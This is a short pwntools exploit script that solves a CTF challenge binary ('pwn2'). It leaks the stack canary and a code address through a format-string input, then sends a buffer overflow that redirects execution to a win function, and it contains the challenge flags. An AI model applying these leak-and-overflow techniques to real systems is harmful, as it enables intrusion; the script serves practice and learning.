#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./pwn2")
libc = exe.libc

r = None
def connect(fresh=True, local=False):
    global r
    if r is not None:
        if fresh:
            r.close()
        else:
            return
    r = remote("hax1.allesctf.net", 9101) if args.REMOTE and not local else exe.process()

connect()

r.sendlineafter("Enter the password of stage 1:", "CSCG{NOW_PRACTICE_MORE}")
r.sendlineafter("witch name:\n", "cookie %39$p cookiend out %41$p outend")
cookie = int(r.recvuntil(b" cookiend", drop=True).split(b" ")[-1], 16)
info("cookie %#x", cookie)
addr = r.recvuntil(b" outend", drop=True).split(b" ")[-1].decode()
exe.address += int(addr, 16) - (exe.symbols.main + 55)
success("exe base: %#x", exe.address)

r.sendlineafter("magic spell:", flat({
    0x0: "Expelliarmus\0" ,
    0x108: cookie,
    0x118: [
        # stack alignment,
        exe.address + 0x991,
        exe.symbols.WINgardium_leviosa
    ]

}))

r.interactive()
# CSCG{NOW_GET_VOLDEMORT}
